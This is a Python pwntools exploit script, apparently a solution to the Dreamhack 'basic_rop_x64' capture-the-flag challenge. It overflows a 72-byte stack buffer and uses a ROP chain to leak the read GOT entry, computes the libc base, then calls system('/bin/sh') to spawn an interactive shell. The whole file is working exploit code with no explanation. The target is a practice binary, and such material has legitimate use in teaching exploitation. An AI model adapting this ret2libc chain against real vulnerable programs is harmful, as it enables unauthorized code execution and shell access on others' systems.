from pwn import *

p = process("./basic_rop_x64")
#p = remote("host3.dreamhack.games", 20091)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6",checksec=False)
r = ROP(e)

read_got = e.got['read']
read_plt = e.plt['read']
write_got = e.got['write']
write_plt = e.plt['write']
main = e.symbols['main']
read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
pop_rdi_ret = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
#pop_rdi_ret = r.find_gadget(['pop rdi', 'ret'])[0]
#pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
sh = list(libc.search(b"/bin/sh"))[0]

payload = b'A'*72
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15) + p64(read_got) + p64(8) + p64(write_plt) + p64(main)
p.send(payload)
p.recvuntil(b'A'*0x40)
read_add = u64(p.recvn(8))
libc_base = read_add - read_offset
system = libc_base + system_offset
bin_sh = sh + libc_base

payload = b'A'*72
payload += p64(pop_rdi_ret) + p64(bin_sh) + p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()